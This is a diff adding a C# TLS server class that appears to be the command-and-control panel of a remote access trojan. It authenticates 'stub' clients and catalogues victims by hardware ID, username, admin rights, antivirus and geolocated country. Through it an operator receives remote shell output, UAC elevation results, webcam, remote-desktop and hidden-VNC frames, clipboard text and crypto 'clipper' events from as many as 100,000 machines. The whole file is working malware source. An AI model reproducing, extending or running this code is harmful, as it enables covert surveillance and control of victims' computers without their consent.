@@ -1,0 +1,676 @@
+using System.Collections.Concurrent;
+using System.IO;
+using System.Net;
+using System.Net.Http;
+using System.Net.Security;
+using System.Net.Sockets;
+using System.Security.Cryptography.X509Certificates;
+using System.Text.Json;
+using SeroServer.Data;
+using SeroServer.Protocol;
+using SeroServer.UI;
+
+namespace SeroServer.Net;
+
+public class TlsServer
+{
+    private TcpListener? _listener;
+    private X509Certificate2? _cert;
+    private CancellationTokenSource? _cts;
+    private readonly DataStore _store;
+    private static readonly HttpClient _http = new() { Timeout = TimeSpan.FromSeconds(5) };
+    private readonly ConcurrentDictionary<string, (string country, string code)> _countryCache = new();
+    // ip-api.com free plan: 45 req/min. Cap at 10 concurrent lookups to avoid HTTP 429 bursts.
+    private readonly SemaphoreSlim _countrySem = new(10, 10);
+    private System.Timers.Timer? _watchdogTimer;
+    public int MaxConnectedClients { get; set; } = 100_000;
+
+    private string _authKey = string.Empty;
+    private byte[] _expectedAuthBytes = [];
+    public string AuthKey
+    {
+        get => _authKey;
+        set { _authKey = value ?? string.Empty; _expectedAuthBytes = System.Text.Encoding.UTF8.GetBytes(_authKey); }
+    }
+    public Func<string>? GetClientIdPrefix { get; set; }
+    public ConcurrentDictionary<string, ConnectedClient> ConnectedClients { get; } = new();
+    public event Action<ConnectedClient>? ClientConnected;
+    public event Action<ConnectedClient>? ClientDisconnected;
+    public event Action<string, string>? ShellOutputReceived;
+    public event Action<string, string>? AutoTaskShellOutputReceived;
+    public event Action<string, ElevationResultData>? ElevationResultReceived;
+    public event Action<string, string>? RdpFrameReceived;      // clientId, rawJson
+    public event Action<string, string>? WcamFrameReceived;     // clientId, rawJson
+    public event Action<string, string>? RdpClipboardReceived;  // clientId, text
+    public event Action<string, string>? HvncFrameReceived;     // clientId, rawJson
+    public event Action<string, ClipperDetectedData>?     ClipperDetectedReceived;    // clientId, data
+    public event Action<string, WindowNotifyAlertData>?   WindowNotifyAlertReceived;  // clientId, data
+    public event Action<string>? OnLog;
+
+    public bool IsRunning { get; private set; }
+
+    private static readonly Packet _heartbeatAckPacket = new() { Type = PacketType.HeartbeatAck };
+    public int  Port      { get; private set; }
+
+    // Per-(client,packetType) dynamic handlers — used by feature windows
+    private readonly ConcurrentDictionary<(string, PacketType), Action<Packet>> _handlers = new();
+    private static readonly PacketType[] _allPacketTypes = Enum.GetValues<PacketType>();
+
+    // ── Rate limiting & auth-fail tracking ──────────────────────────────
+    // Tracks (attempt_count, window_expiry) per IP for connection rate limiting
+    private readonly ConcurrentDictionary<string, (int count, DateTime reset)> _connRate  = new();
+    // Tracks consecutive auth failures per IP — temp-bans after 5 failures in 60s
+    private readonly ConcurrentDictionary<string, (int fails, DateTime unbanAt)> _authFail = new();
+    // HWID+prefix → active client — O(1) stale-connection lookup on reconnect (replaces O(n) Values scan)
+    private readonly ConcurrentDictionary<string, ConnectedClient> _hwidToClient = new(StringComparer.OrdinalIgnoreCase);
+
+    private const int MaxConnPerMinute  = 30;  // max new connections per IP per minute
+    private const int MaxAuthFails      = 5;   // auth failures before 5-minute temp-ban
+
+    private bool IsRateLimited(string ip)
+    {
+        var now = DateTime.UtcNow;
+        var updated = _connRate.AddOrUpdate(ip,
+            _ => (1, now.AddMinutes(1)),
+            (_, v) => now > v.reset ? (1, now.AddMinutes(1)) : (v.count + 1, v.reset));
+        return updated.count > MaxConnPerMinute;
+    }
+
+    private bool IsTempBanned(string ip)
+    {
+        if (!_authFail.TryGetValue(ip, out var v)) return false;
+        if (DateTime.UtcNow > v.unbanAt) { _authFail.TryRemove(ip, out _); return false; }
+        return v.fails >= MaxAuthFails;
+    }
+
+    private void RecordAuthFailure(string ip)
+    {
+        var now = DateTime.UtcNow;
+        var r = _authFail.AddOrUpdate(ip,
+            _ => (1, now.AddMinutes(5)),
+            (_, v) =>
+            {
+                if (now > v.unbanAt) return (1, now.AddMinutes(5));
+                return (v.fails + 1, now.AddMinutes(5)); // extend ban on each new failure
+            });
+        if (r.fails >= MaxAuthFails)
+            Log($"[RATE] {ip} temp-banned for 5 min after {r.fails} auth failures.");
+    }
+
+    public void RegisterHandler(string clientId, PacketType type, Action<Packet> handler)
+        => _handlers[(clientId, type)] = handler;
+
+    public void UnregisterHandler(string clientId, PacketType type)
+        => _handlers.TryRemove((clientId, type), out _);
+
+    public TlsServer(DataStore store) => _store = store;
+
+    public void Start(int port)
+    {
+        if (IsRunning) return;
+        Port = port;
+
+        _cert = CertificateHelper.GetOrCreateCertificate();
+        _cts = new CancellationTokenSource();
+        _listener = new TcpListener(IPAddress.Any, port);
+        _listener.Start();
+        IsRunning = true;
+
+        Log($"[*] TLS Server started on port {port}");
+        _ = AcceptLoop(_cts.Token);
+
+        _watchdogTimer = new System.Timers.Timer(15_000) { AutoReset = true };
+        _watchdogTimer.Elapsed += WatchdogTick;
+        _watchdogTimer.Start();
+    }
+
+    private void WatchdogTick(object? sender, System.Timers.ElapsedEventArgs e)
+    {
+        // ConcurrentDictionary.Values enumeration is already thread-safe — ToList() not needed
+        foreach (var client in ConnectedClients.Values)
+        {
+            if (!client.IsAlive)
+            {
+                Log($"[WATCHDOG] {client.Id} heartbeat timeout — disconnecting zombie.");
+                DisconnectClient(client.Id);
+            }
+        }
+
+        // Evict expired rate-limit and auth-fail entries — prevents unbounded growth
+        // when 100k+ unique IPs connect over the server's lifetime (scans, bots, etc.)
+        var now = DateTime.UtcNow;
+        foreach (var ip in _connRate.Keys)
+            if (_connRate.TryGetValue(ip, out var r) && now > r.reset)
+                _connRate.TryRemove(ip, out _);
+        foreach (var ip in _authFail.Keys)
+            if (_authFail.TryGetValue(ip, out var v) && now > v.unbanAt)
+                _authFail.TryRemove(ip, out _);
+        // Country cache has no natural expiry — cap at 50k entries to prevent unbounded growth.
+        // Progressive eviction removes ~10k random entries instead of clearing the whole cache,
+        // so common IPs that reconnect immediately after eviction don't all miss at once.
+        if (_countryCache.Count > 50_000)
+        {
+            var toRemove = _countryCache.Keys.Take(10_000).ToList();
+            foreach (var k in toRemove) _countryCache.TryRemove(k, out _);
+        }
+    }
+
+    public void Stop()
+    {
+        if (!IsRunning) return;
+        _watchdogTimer?.Stop();
+        _watchdogTimer?.Dispose();
+        _watchdogTimer = null;
+        _cts?.Cancel();
+        _listener?.Stop();
+        IsRunning = false;
+
+        foreach (var client in ConnectedClients.Values.ToList())
+        {
+            try { client.Cts.Cancel(); client.Stream?.Close(); } catch { }
+        }
+        ConnectedClients.Clear();
+        _hwidToClient.Clear();
+    }
+
+    public async Task SendToClient(string clientId, Packet packet)
+    {
+        if (ConnectedClients.TryGetValue(clientId, out var client) && client.Stream != null)
+        {
+            // 8s timeout: prevents feature windows from hanging on dead clients
+            // (watchdog detects them in ~12s anyway, this just unblocks senders faster)
+            if (!await client.WriteLock.WaitAsync(TimeSpan.FromSeconds(8)))
+            {
+                DisconnectClient(clientId);
+                return;
+            }
+            bool failed = false;
+            try
+            {
+                // Re-check stream after acquiring lock — client may have disconnected.
+                // Do NOT call Release() here: finally always runs and will release.
+                if (client.Stream == null) return;
+                await Packet.WriteToStreamAsync(client.Stream, packet);
+            }
+            catch { failed = true; }
+            finally { client.WriteLock.Release(); }
+            // Disconnect AFTER releasing lock to avoid deadlock with read loop
+            if (failed) DisconnectClient(clientId);
+        }
+    }
+
+    /// <summary>
+    /// Sends HeartbeatAck followed by Ping under a single WriteLock acquisition.
+    /// PingSentAt is captured AFTER acquiring the lock so queuing delay behind other
+    /// outbound writes is excluded from the RTT measurement.
+    /// </summary>
+    private async Task SendHeartbeatAckAndPing(ConnectedClient client)
+    {
+        if (!await client.WriteLock.WaitAsync(TimeSpan.FromSeconds(8)))
+        {
+            DisconnectClient(client.Id);
+            return;
+        }
+        bool failed = false;
+        try
+        {
+            if (client.Stream == null) return;
+            await Packet.WriteToStreamAsync(client.Stream, _heartbeatAckPacket);
+            client.PingSentAt = DateTime.UtcNow;
+            client.PingPacket.Data = client.PingSentAt.Ticks.ToString();
+            await Packet.WriteToStreamAsync(client.Stream, client.PingPacket);
+        }
+        catch { failed = true; }
+        finally { client.WriteLock.Release(); }
+        if (failed) DisconnectClient(client.Id);
+    }
+
+    private static readonly ParallelOptions _sendAllOpts = new() { MaxDegreeOfParallelism = 256 };
+
+    // Parallel.ForEachAsync with MaxDegreeOfParallelism caps concurrency to 256 WITHOUT
+    // creating N tasks upfront. The old Select(async)+Task.WhenAll pattern would allocate
+    // 100k async state machines before the semaphore throttled anything (~20 MB GC peak).
+    public Task SendToAll(Packet packet)
+        => Parallel.ForEachAsync(
+               ConnectedClients.Values,
+               _sendAllOpts,
+               async (c, _) => await SendToClient(c.Id, packet).ConfigureAwait(false));
+
+    public void DisconnectClient(string clientId)
+    {
+        if (ConnectedClients.TryRemove(clientId, out var client))
+        {
+            var pfx = client.Id.Contains('-') ? client.Id[..client.Id.IndexOf('-')] : "";
+            _hwidToClient.TryRemove(new KeyValuePair<string, ConnectedClient>(client.Hwid + ":" + pfx, client));
+            try { client.Cts.Cancel(); client.Stream?.Dispose(); } catch { }
+            if (_store.AllClients.TryGetValue(client.Hwid, out var rec))
+            {
+                if (!string.IsNullOrEmpty(client.CpuName)) rec.LastCpuName = client.CpuName;
+                if (!string.IsNullOrEmpty(client.GpuName)) rec.LastGpuName = client.GpuName;
+                if (client.RamTotal > 0) { rec.LastRamUsed = client.RamUsed; rec.LastRamTotal = client.RamTotal; }
+            }
+            _store.RecordDisconnection(client.Hwid);
+            Log($"[*] Client {client.Id} ({client.Username}@{client.IP}) disconnected.");
+            // Purge feature-window handlers: try O(1) removes per known PacketType first,
+            // then fall back to full scan only if stragglers remain (avoids O(n) at scale)
+            foreach (PacketType pt in _allPacketTypes)
+                _handlers.TryRemove((clientId, pt), out _);
+            ClientDisconnected?.Invoke(client);
+        }
+    }
+
+    // ── Private ─────────────────────────────────────
+
+    private async Task AcceptLoop(CancellationToken ct)
+    {
+        while (!ct.IsCancellationRequested)
+        {
+            try
+            {
+                var tcp = await _listener!.AcceptTcpClientAsync(ct);
+                _ = HandleClient(tcp, ct);
+            }
+            catch (OperationCanceledException) { break; }
+            catch (Exception ex) { Log($"[!] Accept error: {ex.Message}"); }
+        }
+    }
+
+    private async Task HandleClient(TcpClient tcp, CancellationToken serverCt)
+    {
+        tcp.NoDelay = true;
+        var ep = tcp.Client.RemoteEndPoint as IPEndPoint;
+        var ip = ep?.Address.ToString() ?? "?";
+        ConnectedClient? client = null;
+
+        // Rate limit: reject if IP is temp-banned or connecting too fast
+        if (IsTempBanned(ip))
+        {
+            tcp.Close();
+            return;
+        }
+        // Loopback is always a local tunnel proxy (localtonet, ngrok, etc.) — exempt from rate limiting.
+        bool isLoopback = ip is "127.0.0.1" or "::1" or "localhost";
+        if (!isLoopback && IsRateLimited(ip))
+        {
+            Log($"[RATE] {ip} rate-limited ({MaxConnPerMinute} connections/min exceeded).");
+            tcp.Close();
+            return;
+        }
+
+        SslStream? sslStream = null;
+        try
+        {
+            sslStream = new SslStream(tcp.GetStream(), false);
+            await sslStream.AuthenticateAsServerAsync(_cert!);
+
+            // Wait for ClientInfo packet — 64 KB cap prevents pre-auth memory exhaustion
+            var infoPacket = await Packet.ReadFromStreamAsync(sslStream, serverCt, maxPacketSize: 64 * 1024);
+            if (infoPacket == null || infoPacket.Type != PacketType.ClientInfo)
+            {
+                Log($"[!] Client {ip} sent invalid handshake (expected ClientInfo, got {infoPacket?.Type}).");
+                tcp.Close();
+                return;
+            }
+
+            ClientInfoData? info;
+            try { info = JsonSerializer.Deserialize(infoPacket.Data, ServerJsonContext.Default.ClientInfoData); }
+            catch { info = null; }
+            if (info == null)
+            {
+                Log($"[!] Client {ip} sent malformed ClientInfo JSON.");
+                tcp.Close();
+                return;
+            }
+
+            // Auth key verification — constant-time to prevent timing oracle
+            var receivedBytes = System.Text.Encoding.UTF8.GetBytes(info.AuthKey ?? "");
+            bool authOk = _expectedAuthBytes.Length == receivedBytes.Length
+                          && System.Security.Cryptography.CryptographicOperations.FixedTimeEquals(_expectedAuthBytes, receivedBytes);
+            if (!authOk)
+            {
+                RecordAuthFailure(ip);
+                Log($"[AUTH] Rejected {ip}: invalid auth key.");
+                tcp.Close();
+                return;
+            }
+
+            string clientId;
+            bool knownHwid = _store.AllClients.TryGetValue(info.Hwid, out var existingRecord);
+            // Reuse saved ID only when the prefix matches — a new build with a different
+            // IdPrefix must get a fresh ID so the display updates correctly.
+            bool reuseId = knownHwid
+                && !string.IsNullOrEmpty(existingRecord!.AssignedId)
+                && (string.IsNullOrEmpty(info.IdPrefix)
+                    || existingRecord.AssignedId.StartsWith(info.IdPrefix + "-", StringComparison.Ordinal));
+
+            if (reuseId)
+            {
+                clientId = existingRecord!.AssignedId;
+            }
+            else
+            {
+                var prefix = !string.IsNullOrEmpty(info.IdPrefix)
+                    ? SanitizeIdPrefix(info.IdPrefix)
+                    : (!knownHwid ? GetClientIdPrefix?.Invoke() ?? "" : "");
+                clientId = string.IsNullOrEmpty(prefix)
+                    ? Guid.NewGuid().ToString("N")[..8]
+                    : $"{prefix}-{Guid.NewGuid().ToString("N")[..8]}";
+            }
+
+            string displayIp = ip;
+            if (!string.IsNullOrWhiteSpace(info.IP)
+                && System.Net.IPAddress.TryParse(info.IP, out var parsedIp)
+                && !System.Net.IPAddress.IsLoopback(parsedIp))
+            {
+                displayIp = info.IP;
+            }
+
+            client = new ConnectedClient
+            {
+                Id = clientId,
+                Hwid = info.Hwid,
+                InstanceId = info.InstanceId,
+                Username = info.Username,
+                IP = displayIp,
+                OS = info.OS,
+                MachineName = info.MachineName,
+                IsAdmin = info.IsAdmin,
+                Payload = info.Payload,
+                Antivirus = info.Antivirus,
+                Stream = sslStream,
+                Port = Port,
+            };
+
+            // Resolve country from effective IP
+            var (country, countryCode) = await ResolveCountryAsync(displayIp);
+            client.Country = country;
+            client.CountryCode = countryCode;
+            FlagCache.QueueLoad(client, countryCode);
+
+            // Restore tag + first seen from persistent record
+            var record = _store.RecordConnection(client);
+            client.Tag = record.Tag;
+            client.FirstSeen = record.FirstSeen;
+
+            // Persist the assigned ID (or overwrite when prefix changed)
+            if (record.AssignedId != clientId)
+                _store.SetAssignedId(client.Hwid, clientId);
+
+            // Evict an existing connection from the same HWID only when it's the same build
+            // (same IdPrefix). Two stubs with different IdPrefixes running on the same machine
+            // are independent programs and must coexist in the client list.
+            string newPfx = info.IdPrefix ?? "";
+            // O(1) stale lookup via HWID+prefix index — replaces O(n) ConnectedClients.Values scan
+            // that would cost O(100k) per reconnect at 100k connected clients.
+            var hwidKey = client.Hwid + ":" + newPfx;
+            ConnectedClient? stale = null;
+            if (_hwidToClient.TryGetValue(hwidKey, out var prev) && prev.Id != client.Id)
+                stale = prev;
+
+            int effectiveCount = ConnectedClients.Count - (stale != null ? 1 : 0);
+            if (effectiveCount >= MaxConnectedClients)
+            {
+                Log($"[LIMIT] Rejected {ip} (max {MaxConnectedClients} clients reached).");
+                tcp.Close();
+                return;
+            }
+
+            ConnectedClients[client.Id] = client;
+            _hwidToClient[hwidKey] = client;
+            if (stale != null)
+                DisconnectClient(stale.Id);
+            Log($"[+] Client {client.Id} connected ({info.Username}@{ip}, {client.Country})");
+            ClientConnected?.Invoke(client);
+
+            // No per-client watchdog task — _watchdogTimer (15s) handles zombie detection for all clients
+            using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(serverCt, client.Cts.Token);
+            while (!linkedCts.Token.IsCancellationRequested)
+            {
+                var packet = await Packet.ReadFromStreamAsync(sslStream, linkedCts.Token);
+                if (packet == null) break;
+
+                switch (packet.Type)
+                {
+                    case PacketType.Heartbeat:
+                        // Fire-and-forget via SendHeartbeatAckAndPing — keeps the read loop
+                        // moving so the TCP receive buffer does not stall. The timestamp
+                        // for the ping RTT is captured AFTER WriteLock acquisition (inside the
+                        // async helper) so queuing delay behind other outbound packets does NOT
+                        // inflate the reported ping.
+                        client.LastHeartbeat = DateTime.UtcNow;
+                        _ = SendHeartbeatAckAndPing(client);
+                        break;
+
+                    case PacketType.Pong:
+                        if (long.TryParse(packet.Data, out long ticks))
+                        {
+                            var rtt = DateTime.UtcNow - new DateTime(ticks, DateTimeKind.Utc);
+                            client.PingMs = (int)rtt.TotalMilliseconds;
+                        }
+                        break;
+
+                    case PacketType.HardwareStats:
+                        var hwStats = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.HardwareStatsData);
+                        if (hwStats != null)
+                        {
+                            client.LastHwStatsAt = DateTime.UtcNow;
+                            client.CpuUsage    = hwStats.CpuUsage;
+                            client.RamUsed     = hwStats.RamUsed;
+                            client.RamTotal    = hwStats.RamTotal;
+                            client.IdleSeconds = hwStats.IdleSeconds;
+                            if (!string.IsNullOrEmpty(hwStats.CpuName)) client.CpuName = hwStats.CpuName;
+                            if (!string.IsNullOrEmpty(hwStats.GpuName)) client.GpuName = hwStats.GpuName;
+                            if (_store.AllClients.TryGetValue(client.Hwid, out var hwRec) && hwStats.RamTotal > 0)
+                            {
+                                hwRec.LastRamUsed  = hwStats.RamUsed;
+                                hwRec.LastRamTotal = hwStats.RamTotal;
+                            }
+                        }
+                        break;
+
+                    case PacketType.ClientInfo:
+                        var updated = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.ClientInfoData);
+                        if (updated != null)
+                        {
+                            client.OS = updated.OS;
+                            client.MachineName = updated.MachineName;
+                            client.IsAdmin = updated.IsAdmin;
+                            if (!string.IsNullOrEmpty(updated.Payload))
+                                client.Payload = updated.Payload;
+                        }
+                        break;
+
+                    case PacketType.ShellOutput:
+                        var shellData = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.ShellOutputData);
+                        if (shellData != null)
+                        {
+                            _store.RecordActivity(client.Hwid, $"Shell output (exit={shellData.ExitCode})");
+                            ShellOutputReceived?.Invoke(client.Id, shellData.Output);
+                        }
+                        break;
+
+                    case PacketType.AutoTaskShellOutput:
+                        var atShellData = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.ShellOutputData);
+                        if (atShellData != null)
+                            AutoTaskShellOutputReceived?.Invoke(client.Id, atShellData.Output);
+                        break;
+
+                    case PacketType.ElevationResult:
+                        var elevData = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.ElevationResultData);
+                        if (elevData != null)
+                        {
+                            _store.RecordActivity(client.Hwid, $"Elevation: {(elevData.Success ? "OK" : "FAILED")} - {elevData.Message}");
+                            Log($"[UAC] {client.Id}: {(elevData.Success ? "Elevated" : "Failed")} - {elevData.Message}");
+                            ElevationResultReceived?.Invoke(client.Id, elevData);
+                        }
+                        break;
+
+                    case PacketType.ActiveWindow:
+                        if (packet.Data.Length <= 512)
+                            client.ActiveWindow = packet.Data;
+                        break;
+                    case PacketType.CameraStatus:
+                        if (packet.Data.Length <= 16)
+                            client.CameraStatus = packet.Data;
+                        break;
+
+                    case PacketType.RdpFrame:
+                        // Try O(1) per-client handler first; fall back to broadcast event
+                        if (_handlers.TryGetValue((client.Id, PacketType.RdpFrame), out var rdpH))
+                            try { rdpH(packet); } catch { }
+                        else
+                            RdpFrameReceived?.Invoke(client.Id, packet.Data);
+                        break;
+
+                    case PacketType.WcamFrame:
+                    case PacketType.WcamDevices:
+                        if (_handlers.TryGetValue((client.Id, packet.Type), out var wcamH))
+                            try { wcamH(packet); } catch { }
+                        else
+                            WcamFrameReceived?.Invoke(client.Id, packet.Data);
+                        break;
+
+                    case PacketType.RdpClipboard:
+                        if (_handlers.TryGetValue((client.Id, PacketType.RdpClipboard), out var rdpClipH))
+                            try { rdpClipH(packet); } catch { }
+                        else
+                        {
+                            var clipMsg = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.RdpClipboardData);
+                            if (clipMsg != null && !string.IsNullOrEmpty(clipMsg.Text))
+                                RdpClipboardReceived?.Invoke(client.Id, clipMsg.Text);
+                        }
+                        break;
+
+                    case PacketType.HvncFrame:
+                        if (_handlers.TryGetValue((client.Id, PacketType.HvncFrame), out var hvncH))
+                            try { hvncH(packet); } catch { }
+                        else
+                            HvncFrameReceived?.Invoke(client.Id, packet.Data);
+                        break;
+
+                    case PacketType.ClipperDetected:
+                        var clipDet = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.ClipperDetectedData);
+                        if (clipDet != null)
+                            ClipperDetectedReceived?.Invoke(client.Id, clipDet);
+                        break;
+
+                    case PacketType.WindowNotifyAlert:
+                        var wnAlert = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.WindowNotifyAlertData);
+                        if (wnAlert != null)
+                            WindowNotifyAlertReceived?.Invoke(client.Id, wnAlert);
+                        break;
+
+                    default:
+                        // Route to any dynamically registered handler (TCP/Startup/File/Mic/Fun windows)
+                        if (_handlers.TryGetValue((client.Id, packet.Type), out var dynHandler))
+                            try { dynHandler(packet); } catch { }
+                        break;
+                }
+            }
+        }
+        catch (OperationCanceledException) { }
+        catch (Exception ex)
+        {
+            if (client is { PendingUninstall: true })
+                Log($"[+] Client {client.Id} ({client.Username}@{ip}) uninstalled successfully.");
+            else if (client != null
+                  && ex is not System.IO.IOException          // normal TCP close — already logged as disconnect
+                  && ex is not ObjectDisposedException        // stream disposed on disconnect
+                  && !ex.Message.Contains("decryption operation failed", StringComparison.OrdinalIgnoreCase)
+                  && !ex.Message.Contains("authentication failed", StringComparison.OrdinalIgnoreCase))
+                Log($"[!] Client {client.Id} ({ip}) error: {ex.Message.Replace("\r\n", " ").Replace("\n", " ")}");
+        }
+        finally
+        {
+            try { sslStream?.Dispose(); } catch { }
+            tcp.Close();
+            if (client != null) DisconnectClient(client.Id);
+        }
+    }
+
+    private static bool IsLocalOrPrivateIp(string ip)
+    {
+        if (string.IsNullOrEmpty(ip)) return true;
+        if (!System.Net.IPAddress.TryParse(ip, out var addr)) return false;
+        if (System.Net.IPAddress.IsLoopback(addr)) return true;
+        if (addr.IsIPv4MappedToIPv6) addr = addr.MapToIPv4();
+        var b = addr.GetAddressBytes();
+        if (b.Length == 4)
+            return b[0] == 10
+                || b[0] == 127
+                || (b[0] == 172 && b[1] is >= 16 and <= 31)
+                || (b[0] == 192 && b[1] == 168)
+                || (b[0] == 169 && b[1] == 254);   // APIPA link-local
+        if (b.Length == 16)
+            return (b[0] == 0xfe && (b[1] & 0xc0) == 0x80)  // fe80::/10 link-local
+                || ((b[0] & 0xfe) == 0xfc);                   // fc00::/7 unique-local
+        return false;
+    }
+
+    private async Task<(string country, string code)> ResolveCountryAsync(string ip)
+    {
+        if (IsLocalOrPrivateIp(ip))
+        {
+            bool isLoopback = string.IsNullOrEmpty(ip) || ip == "127.0.0.1" || ip == "::1"
+                || (System.Net.IPAddress.TryParse(ip, out var a) && System.Net.IPAddress.IsLoopback(a));
+            return isLoopback ? ("Localhost", "loc") : ("LAN", "lan");
+        }
+
+        // Fast path — already cached
+        if (_countryCache.TryGetValue(ip, out var cached))
+            return cached;
+
+        await _countrySem.WaitAsync();
+        try
+        {
+            // Re-check after acquiring semaphore — another caller may have resolved this IP
+            if (_countryCache.TryGetValue(ip, out cached)) return cached;
+
+            // ip-api.com free plan only supports HTTP (HTTPS requires paid plan)
+            var url  = $"http://ip-api.com/json/{ip}?fields=status,country,countryCode";
+            var json = await _http.GetStringAsync(url);
+            var obj  = JsonSerializer.Deserialize(json, ServerJsonContext.Default.IpApiResponse);
+            // Only cache on success — don't permanently cache rate-limit (429) or error responses
+            if (obj == null || !string.Equals(obj.status, "success", StringComparison.OrdinalIgnoreCase))
+                return ("Unknown", "");
+            var country = obj.country ?? "Unknown";
+            var code    = obj.countryCode ?? "";
+            var result  = (country, code);
+            _countryCache.TryAdd(ip, result);
+            return result;
+        }
+        catch
+        {
+            return ("Unknown", "");
+        }
+        finally
+        {
+            _countrySem.Release();
+        }
+    }
+
+    // Whitelist-sanitize stub-supplied IdPrefix: allow only alphanumeric, hyphen, underscore.
+    // Prevents path traversal when clientId is used in server file paths (e.g. webcam auto-save).
+    // Normal prefixes ("USA", "EUROPE", "TEST-1") pass through unchanged.
+    private static string SanitizeIdPrefix(string p)
+    {
+        var sb = new System.Text.StringBuilder(p.Length);
+        foreach (char c in p)
+            if (char.IsLetterOrDigit(c) || c == '-' || c == '_') sb.Append(c);
+        return sb.ToString();
+    }
+
+    private void Log(string msg)
+    {
+        _store.Log(msg);
+        OnLog?.Invoke(msg);
+    }
+}
+
+// Typed response for ip-api.com
+internal sealed class IpApiResponse
+{
+    public string? status      { get; set; }
+    public string? country     { get; set; }
+    public string? countryCode { get; set; }
+}
